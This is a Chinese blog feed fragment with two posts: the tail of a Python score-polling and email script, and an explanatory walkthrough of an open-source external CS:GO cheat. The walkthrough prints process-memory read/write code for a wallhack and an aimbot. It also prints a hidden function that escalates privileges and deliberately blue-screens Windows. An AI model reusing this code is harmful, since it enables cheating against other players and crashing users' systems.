class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip,deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">            <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://yz.chsi.com.cn/apply/cjcx/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cache-Control&#x27;</span>:<span class="string">&#x27;no-cache&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = urllib.urlencode(post)</span><br><span class="line">    req = urllib2.Request(url, data,headers)</span><br><span class="line">    response = urllib2.urlopen(req)</span><br><span class="line">    page_source = response.read()</span><br><span class="line">    <span class="keyword">return</span> page_source</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mainfunc</span>():</span></span><br><span class="line">    url=<span class="string">&#x27;https://yz.chsi.com.cn/apply/code/cjcxdw.do?ssdm=11&amp;ts=&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(<span class="built_in">round</span>(time.time() * <span class="number">1000</span>)))</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;yz.chsi.com.cn&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Cookie&#x27;</span>: cookie,</span><br><span class="line">               <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://yz.chsi.com.cn/apply/cjcx/&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span></span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;开始查询!&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req = urllib2.Request(url, <span class="literal">None</span>, headers)</span><br><span class="line">        response = urllib2.urlopen(req)</span><br><span class="line">        res = response.read()</span><br><span class="line">        jsonobj=json.loads(res)</span><br><span class="line">        schoolist=jsonobj[<span class="string">&#x27;dms&#x27;</span>]</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="comment">#设置默认学校代码，可以随便填</span></span><br><span class="line">        schoolcode=<span class="number">10050</span></span><br><span class="line">        <span class="keyword">global</span> timer</span><br><span class="line">        <span class="comment">#查找是否有北航</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> schoolist:</span><br><span class="line">            schoolname=i[<span class="string">&#x27;mc&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> schoolname.encode(<span class="string">&#x27;utf-8&#x27;</span>) == <span class="string">&#x27;北京航空航天大学&#x27;</span>:</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                schoolcode=i[<span class="string">&#x27;dm&#x27;</span>]</span><br><span class="line">        <span class="comment">#查到之后构造查询参数</span></span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">1</span>):</span><br><span class="line">            url2 = <span class="string">&#x27;https://yz.chsi.com.cn/apply/cjcx/cjcx.do&#x27;</span></span><br><span class="line">            post = &#123;<span class="string">&#x27;xm&#x27;</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="string">&#x27;zjhm&#x27;</span>:<span class="string">&#x27;身份证号&#x27;</span>, <span class="string">&#x27;ksbh&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;bkdwdm&#x27;</span>: schoolcode, <span class="string">&#x27;checkcode&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">            re = fetch2(url2, post)</span><br><span class="line">            <span class="comment">#解压收到的gzip网页</span></span><br><span class="line">            re = StringIO.StringIO(re)</span><br><span class="line">            gz = gzip.GzipFile(fileobj=re)</span><br><span class="line">            re = gz.read()</span><br><span class="line">            gz.close()</span><br><span class="line">            <span class="comment">#构造邮件消息，发送HTML类型邮件</span></span><br><span class="line">            message = MIMEText(re, _subtype=<span class="string">&#x27;html&#x27;</span>,_charset=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            message[<span class="string">&#x27;From&#x27;</span>] = <span class="string">&quot;lufer&lt;*********@163.com&gt;&quot;</span>        <span class="comment">#发件人姓名</span></span><br><span class="line">            message[<span class="string">&#x27;To&#x27;</span>] = <span class="string">&quot;Receiver&quot;</span>                          <span class="comment">#收件人姓名</span></span><br><span class="line">            subject = <span class="string">&#x27;出分了！&#x27;</span>                                 <span class="comment">#邮件主题</span></span><br><span class="line">            message[<span class="string">&#x27;Subject&#x27;</span>] = Header(subject, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            smtpObj = smtplib.SMTP()</span><br><span class="line">            smtpObj.connect(mail_host, <span class="number">25</span>)  <span class="comment"># 25 为 SMTP 端口号</span></span><br><span class="line">            smtpObj.ehlo()</span><br><span class="line">            smtpObj.starttls()</span><br><span class="line">            smtpObj.login(mail_user, mail_pass)</span><br><span class="line">            smtpObj.sendmail(sender, receivers, message.as_string())</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;已查询到成绩j，邮件发送成功&quot;</span></span><br><span class="line">            smtpObj.quit()</span><br><span class="line">            timer.cancel()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;没有查询到制定学校&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&#x27;发生了异常：&#x27;</span>, e)</span><br><span class="line">    <span class="comment">#一分钟查询一次</span></span><br><span class="line">    timer = threading.Timer(<span class="number">60</span>, mainfunc)</span><br><span class="line">    timer.start()</span><br><span class="line"></span><br><span class="line">mainfunc()</span><br></pre></td></tr></table></figure><h1 id="查分邮件"><a class="markdownIt-Anchor" href="#查分邮件"></a> 查分邮件</h1><p><img src="https://pic.lufer.cc/images/2021/03/15/e5SPhj.png" alt="" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  自动检索学校列表里有没有指定学校，如果有的话则自动查询成绩，并将结果发送到指定邮箱。&lt;/p&gt;
&lt;p&gt;  有个小BUG就是最后邮件会发两次。&lt;/p&gt;
&lt;p&gt;  基于Python2.7,Python3的urllib可能用法有所不同。&lt;/p&gt;
&lt;p&gt;  先检索是否有指定学校:</summary>
      
    
    
    
    <category term="Python" scheme="https://coder.lufer.cc/categories/Python/"/>
    
    
    <category term="Python" scheme="https://coder.lufer.cc/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CSGO外挂原理解析</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/CSGO%E5%A4%96%E6%8C%82%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/CSGO%E5%A4%96%E6%8C%82%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</id>
    <published>2018-12-18T12:33:22.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>目录</p></blockquote><ul><li><a href="#%E7%AE%80%E4%BB%8B">简介</a></li><li><a href="#%E5%B7%A5%E5%85%B7%E7%B1%BB">工具类</a></li><li><a href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">准备工作</a></li><li><a href="#%E9%80%8F%E8%A7%86">透视</a></li><li><a href="#%E8%87%AA%E7%9E%84">自瞄</a></li><li><a href="#%E8%87%AA%E5%8A%A8%E5%BC%80%E6%9E%AA">自动开枪</a></li><li><a href="#%E8%BF%9E%E8%B7%B3">连跳</a></li><li><a href="#%E7%9A%AE%E8%82%A4%E6%9B%BF%E6%8D%A2">皮肤替换</a></li><li><a href="#%E5%B0%8F%E9%99%80%E8%9E%BA">小陀螺</a></li><li><a href="#%E5%81%8F%E7%A7%BB%E9%87%8FOffset%E7%9A%84%E8%8E%B7%E5%8F%96">偏移量Offset的获取</a></li></ul><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><p>  本文介绍的工作原理有：自瞄(Aimbot),自动开枪(Trigger),透视(Glow Hack),更改皮肤(Skin Changger),连跳(Bunny)</p><p>  外挂为External的外挂，独立运行</p><p>  项目源码：<a href="https://github.com/denizdeni/DeniZeus">https://github.com/denizdeni/DeniZeus</a><br />  运行需要VC环境，VS编译如果跑不起来，改一下运行平台</p><p>  Build一定要选x86,不然会找不到panorama.dll</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">项目目录结构</span><br><span class="line">-JSON.hpp       JSON处理辅助工具</span><br><span class="line">-main.cpp       主程序</span><br><span class="line">-memory.h       内存处理辅助工具</span><br><span class="line">-stdafx.cpp     VS自动生成工程文件</span><br><span class="line">-stdafx.h       VS自动生成工程文件</span><br><span class="line">-targetver.h    VS自动生成工程文件</span><br></pre></td></tr></table></figure><h1 id="工具类"><a class="markdownIt-Anchor" href="#工具类"></a> 工具类</h1><p>  Memory工具类内容比较少，我们先从工具类开始看起</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NBQMemory</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">typename</span> datatype&gt;</span><br><span class="line">    <span class="comment">//指定内存地址，读取数据，返回Buffer</span></span><br><span class="line">    <span class="function">datatype <span class="title">ReadMemory</span><span class="params">(HANDLE hProcess, DWORD address)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        datatype buffer;</span><br><span class="line">        ReadProcessMemory(hProcess, (LPCVOID)address, &amp;buffer, <span class="keyword">sizeof</span>(datatype), <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//指定内存地址，在指定的地址重新写入值</span></span><br><span class="line">    <span class="keyword">template</span> &lt;<span class="keyword">typename</span> datatype&gt;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">WriteMemory</span><span class="params">(HANDLE hProcess, DWORD address, datatype value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        WriteProcessMemory(hProcess, (LPVOID)address, &amp;value, <span class="keyword">sizeof</span>(value), <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过进程名获取进程句柄</span></span><br><span class="line">    <span class="function">HANDLE <span class="title">GetHandleByProcessName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* processName, DWORD dwAccessRights)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        DWORD pID = <span class="literal">NULL</span>;</span><br><span class="line">        HANDLE hProcess = INVALID_HANDLE_VALUE;</span><br><span class="line">        HANDLE ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ss != INVALID_HANDLE_VALUE)</span><br><span class="line">        &#123;</span><br><span class="line">            PROCESSENTRY32 pe;</span><br><span class="line">            pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(pe.szExeFile, processName))</span><br><span class="line">                &#123;</span><br><span class="line">                    pID = pe.th32ProcessID;</span><br><span class="line">                    hProcess = OpenProcess(dwAccessRights, <span class="literal">false</span>, pID);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (Process32Next(ss, &amp;pe));</span><br><span class="line">            CloseHandle(ss);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hProcess;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过进程窗口名获取进程句柄</span></span><br><span class="line">    <span class="function">HANDLE <span class="title">GetHandleByWindowName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* windowName, DWORD dwAccessRights)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        DWORD pID = <span class="literal">NULL</span>;</span><br><span class="line">        HANDLE hProcess = INVALID_HANDLE_VALUE;</span><br><span class="line">        HWND hW = FindWindowA(<span class="literal">NULL</span>, windowName);</span><br><span class="line">        GetWindowThreadProcessId(hW, &amp;pID);</span><br><span class="line">        CloseHandle(hW);</span><br><span class="line">        <span class="keyword">if</span> (pID != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            hProcess = OpenProcess(dwAccessRights, <span class="literal">false</span>, pID);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hProcess;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过进程名获取进程PID</span></span><br><span class="line">    <span class="function">DWORD <span class="title">GetProcessIdByProcessName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* processName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        DWORD pID = <span class="literal">NULL</span>;</span><br><span class="line">        HANDLE ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ss != INVALID_HANDLE_VALUE)</span><br><span class="line">        &#123;</span><br><span class="line">            PROCESSENTRY32 pe;</span><br><span class="line">            pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(pe.szExeFile, processName))</span><br><span class="line">                &#123;</span><br><span class="line">                    pID = pe.th32ProcessID;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (Process32Next(ss, &amp;pe));</span><br><span class="line">            CloseHandle(ss);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pID;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过进程名获取进程PID</span></span><br><span class="line">    <span class="function">DWORD <span class="title">GetProcessIdByWindowName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* windowName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        DWORD pID = <span class="literal">NULL</span>;</span><br><span class="line">        HWND hW = FindWindowA(<span class="literal">NULL</span>, windowName);</span><br><span class="line">        GetWindowThreadProcessId(hW, &amp;pID);</span><br><span class="line">        CloseHandle(hW);</span><br><span class="line">        <span class="keyword">return</span> pID;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这个函数，好像有点骚，在main.cpp里面，如果你Aimbot的平滑度设置为0.0506的时候才会调用此函数，而次函数的功能大概是先进程提权，提权之后...让系统蓝屏...或许这是一个彩蛋吧:)</span></span><br><span class="line">    <span class="function">DWORD <span class="title">memCacher</span><span class="params">(DWORD address)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        BOOLEAN bl;</span><br><span class="line">        ULONG Response;</span><br><span class="line">        address += address;</span><br><span class="line">        RtlAdjustPrivilege(<span class="number">19</span>, TRUE, FALSE, &amp;bl);</span><br><span class="line">        NtRaiseHardError(STATUS_ASSERTION_FAILURE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">6</span>, &amp;Response);</span><br><span class="line">        <span class="keyword">return</span> bl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过进程PID和模块名获取模块的内存地址</span></span><br><span class="line">    <span class="function">DWORD <span class="title">GetModuleBaseAddress</span><span class="params">(DWORD pID, <span class="keyword">const</span> <span class="keyword">char</span>* moduleName)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        DWORD ModuleBaseAddress = <span class="literal">NULL</span>;</span><br><span class="line">        HANDLE ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pID);</span><br><span class="line">        <span class="keyword">if</span> (ss != INVALID_HANDLE_VALUE)</span><br><span class="line">        &#123;</span><br><span class="line">            MODULEENTRY32 me;</span><br><span class="line">            me.dwSize = <span class="keyword">sizeof</span>(MODULEENTRY32);</span><br><span class="line">            <span class="keyword">if</span> (Module32First(ss, &amp;me))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(me.szModule, moduleName))</span><br><span class="line">                    &#123;</span><br><span class="line">                        ModuleBaseAddress = (DWORD)me.modBaseAddr;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">while</span> (Module32Next(ss, &amp;me));</span><br><span class="line">            &#125;</span><br><span class="line">            CloseHandle(ss);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ModuleBaseAddress;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h1><p>  OK，说完了工具类，我们回到main.cpp，按照加载流程介绍工作原理。</p><p>  开始前的准备工作:获取CSGO内存中各主要部分在内存地址的偏移量。<br />  网络版详见 <a href="https://raw.githubusercontent.com/frk1/hazedumper/master/csgo.json">https://raw.githubusercontent.com/frk1/hazedumper/master/csgo.json</a><br />  如果想要自行获取，我会在文章最后面介绍获取方法</p><p>  有了偏移量，我们先把JSON读取之后实例化</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">dwGlowObjectManager = netvars[&quot;signatures&quot;][&quot;dwGlowObjectManager&quot;];</span><br><span class="line">dwlocalPlayer = netvars[&quot;signatures&quot;][&quot;dwLocalPlayer&quot;];</span><br><span class="line">dwForceJump = netvars[&quot;signatures&quot;][&quot;dwForceJump&quot;];</span><br><span class="line">clientState = netvars[&quot;signatures&quot;][&quot;dwClientState&quot;];</span><br><span class="line">forceAttack = netvars[&quot;signatures&quot;][&quot;dwForceAttack&quot;];</span><br><span class="line">entityList = netvars[&quot;signatures&quot;][&quot;dwEntityList&quot;];</span><br><span class="line">clientAngle = netvars[&quot;signatures&quot;][&quot;dwClientState_ViewAngles&quot;];</span><br><span class="line">glowIndex = netvars[&quot;netvars&quot;][&quot;m_iGlowIndex&quot;];</span><br><span class="line">iTeamNum = netvars[&quot;netvars&quot;][&quot;m_iTeamNum&quot;];</span><br><span class="line">vecOrigin = netvars[&quot;netvars&quot;][&quot;m_vecOrigin&quot;];</span><br><span class="line">vecViewOffset = netvars[&quot;netvars&quot;][&quot;m_vecViewOffset&quot;];</span><br><span class="line">SpottedByMask = netvars[&quot;netvars&quot;][&quot;m_bSpottedByMask&quot;];</span><br><span class="line">iHealth = netvars[&quot;netvars&quot;][&quot;m_iHealth&quot;];</span><br><span class="line">fFlags = netvars[&quot;netvars&quot;][&quot;m_fFlags&quot;];</span><br><span class="line">boneMatrix = netvars[&quot;netvars&quot;][&quot;m_dwBoneMatrix&quot;];</span><br><span class="line">m_flFallbackWear = netvars[&quot;netvars&quot;][&quot;m_flFallbackWear&quot;];</span><br><span class="line">m_nFallbackPaintKit = netvars[&quot;netvars&quot;][&quot;m_nFallbackPaintKit&quot;];</span><br><span class="line">m_iItemIDHigh = netvars[&quot;netvars&quot;][&quot;m_iItemIDHigh&quot;];</span><br><span class="line">m_iEntityQuality = netvars[&quot;netvars&quot;][&quot;m_iEntityQuality&quot;];</span><br><span class="line">m_iItemDefinitionIndex = netvars[&quot;netvars&quot;][&quot;m_iItemDefinitionIndex&quot;];</span><br><span class="line">m_hActiveWeapon = netvars[&quot;netvars&quot;][&quot;m_hActiveWeapon&quot;];</span><br><span class="line">m_hMyWeapons = netvars[&quot;netvars&quot;][&quot;m_hMyWeapons&quot;];</span><br><span class="line">CrosshairId = netvars[&quot;netvars&quot;][&quot;m_iCrosshairId&quot;];</span><br></pre></td></tr></table></figure><p>  下面开始Hack In</p><p>  首先获取CSGO.exe</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">dwPID = mem.GetProcessIdByProcessName(<span class="string">&quot;csgo.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>  获取PID之后，通过PID获取client_panorama.dll和engine.dll的内存地址</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">dwClient = mem.GetModuleBaseAddress(dwPID, <span class="string">&quot;client_panorama.dll&quot;</span>);</span><br><span class="line">dwEngine = mem.GetModuleBaseAddress(dwPID, <span class="string">&quot;engine.dll&quot;</span>);</span><br></pre></td></tr></table></figure><p>  拿到这两个地址后，就可以开始读取数据了。</p><h1 id="透视"><a class="markdownIt-Anchor" href="#透视"></a> 透视</h1><p>  首先我们来看透视功能,透视功能主要的原理就是先获取所有人的位置，然后把人物模型颜色改变，再重新写回内存。</p><p>  所以首先还是获取人物</p><p>  当然这个人物分为自己+剩下的63人</p><p>  先获取自己：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取自己的队伍</span></span><br><span class="line">DWORD localTeam = mem.ReadMemory&lt;DWORD&gt;(csgo, localPlayer + iTeamNum);</span><br><span class="line"><span class="comment">//获取自己的位置</span></span><br><span class="line">Players[<span class="number">0</span>].Pos = mem.ReadMemory&lt;Vector&gt;(csgo, localPlayer + vecOrigin);</span><br><span class="line"><span class="comment">//获取自己的视角方向</span></span><br><span class="line">Vector VecView = mem.ReadMemory&lt;Vector&gt;(csgo, localPlayer + vecViewOffset);</span><br><span class="line">Players[<span class="number">0</span>].Pos.x += VecView.x;</span><br><span class="line">Players[<span class="number">0</span>].Pos.y += VecView.y;</span><br><span class="line">Players[<span class="number">0</span>].Pos.z += VecView.z;</span><br></pre></td></tr></table></figure><p>  指定敌我队伍</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (localTeam == <span class="number">3</span>) &#123;</span><br><span class="line">    enemyteam = <span class="number">0x2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    enemyteam = <span class="number">0x3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  再获取剩下的63人</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里没搞懂，i&lt;63的话岂不是获取不到第63个人，感觉这里是个BUG,应该是i&lt;64</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">63</span>; i++) &#123;</span><br><span class="line">    <span class="comment">//从client的地址便宜entityList的大小，到存放玩家数据的地址，然后每个角色占0x10的空间，往后遍历开始拿每个角色的首地址</span></span><br><span class="line">    DWORD player = mem.ReadMemory&lt;<span class="keyword">int</span>&gt;(csgo, client + entityList + ((i - <span class="number">1</span>) * <span class="number">0x10</span>));</span><br><span class="line">    <span class="comment">//角色首地址+队伍地址偏移量，拿到角色的队伍首地址</span></span><br><span class="line">    DWORD playerteam = mem.ReadMemory&lt;<span class="keyword">int</span>&gt;(csgo, player + iTeamNum);</span><br><span class="line">    <span class="comment">//角色首地址+角色骨架偏移量，拿到角色骨架的首地址</span></span><br><span class="line">    DWORD playerbonemtrix = mem.ReadMemory&lt;DWORD&gt;(csgo, player + boneMatrix);</span><br><span class="line">    <span class="comment">//把地址进行存储</span></span><br><span class="line">    Players[i].Base = player;</span><br><span class="line">    Players[i].Team = playerteam;</span><br><span class="line">    <span class="comment">//如果是敌方队伍，获取数据</span></span><br><span class="line">    <span class="keyword">if</span> (playerteam == enemyteam) &#123;</span><br><span class="line">        <span class="comment">//玩家血量</span></span><br><span class="line">        Players[i].Health = mem.ReadMemory&lt;<span class="keyword">int</span>&gt;(csgo, player + iHealth);</span><br><span class="line">        <span class="comment">//这个参数不太懂，应该是处于一种无效的玩家状态</span></span><br><span class="line">        Players[i].Dormant = mem.ReadMemory&lt;<span class="keyword">bool</span>&gt;(csgo, player + bDormant);</span><br><span class="line">        <span class="comment">//获取玩家模型地址</span></span><br><span class="line">        Players[i].GlowIndex = mem.ReadMemory&lt;<span class="keyword">bool</span>&gt;(csgo, player + glowIndex);</span><br><span class="line">        <span class="comment">//玩家是否可见</span></span><br><span class="line">        Players[i].Spotted = EntIsVisible(csgo, player, localPlayer);</span><br><span class="line">        <span class="comment">//获取玩家骨架地址</span></span><br><span class="line">        BoneBase temp = mem.ReadMemory&lt;BoneBase&gt;(csgo, (playerbonemtrix + (<span class="number">0x30</span> * <span class="number">8</span>)));</span><br><span class="line">        <span class="comment">//获取玩家的瞄准角度</span></span><br><span class="line">        Players[i].Pos.x = temp.x;</span><br><span class="line">        Players[i].Pos.y = temp.y;</span><br><span class="line">        Players[i].Pos.z = temp.z;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  OK，这样我们就拿到了剩余玩家的数据，我们只需要把玩家模型重新画一下就可以了</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">63</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Players[i].Team == enemyteam) &#123;</span><br><span class="line">        <span class="comment">//获取人物模型地址</span></span><br><span class="line">        GlowBase entity = mem.ReadMemory&lt;GlowBase&gt;(csgo, GlowObject + ((Players[i].GlowIndex) * <span class="number">0x38</span>) + <span class="number">0x4</span>);</span><br><span class="line">        DWORD entityadr = GlowObject + ((Players[i].GlowIndex) * <span class="number">0x38</span>);</span><br><span class="line">        <span class="comment">//调用glowPlayer重绘人物</span></span><br><span class="line">        glowPlayer(csgo, client, entity, entityadr, Players[i].Health);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//众所周知，颜色由RGBA控制</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">glowPlayer</span><span class="params">(HANDLE csgo, DWORD client, GlowBase entity,DWORD entityadr, <span class="keyword">int</span> Health)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//根据玩家不同血量，将模型显示为不同颜色，rgba均可以根据不同喜好进行设置</span></span><br><span class="line">    entity.r = <span class="number">1.f</span> - (<span class="keyword">float</span>)(Health / <span class="number">100.f</span>);</span><br><span class="line">    entity.g = (<span class="keyword">float</span>)(Health / <span class="number">100.f</span>);</span><br><span class="line">    entity.b = <span class="number">0.f</span>;</span><br><span class="line">    <span class="comment">//alpha 1 ，使颜色完全不透明</span></span><br><span class="line">    entity.a = <span class="number">1.f</span>;</span><br><span class="line">    <span class="comment">//当角色模型被障碍物挡住时依然渲染</span></span><br><span class="line">    entity.m_bRenderWhenOccluded = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">//写回内存，覆盖之前的人物模型</span></span><br><span class="line">    mem.WriteMemory&lt;GlowBase&gt;(csgo, entityadr + <span class="number">0x4</span>, entity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  至此我们就完成了透视功能，游戏内的角色将会显示如下图：</p><p><img src="https://pic.lufer.cc/images/2021/03/15/e4vUEQ.png" alt="" /></p><h1 id="自瞄"><a class="markdownIt-Anchor" href="#自瞄"></a> 自瞄</h1><p>  自瞄肯定不能瞄太远不是，所以首先要获取离自己最近的敌人。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">CloseEnt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//定义一个最远距离fLowest</span></span><br><span class="line"><span class="keyword">float</span> 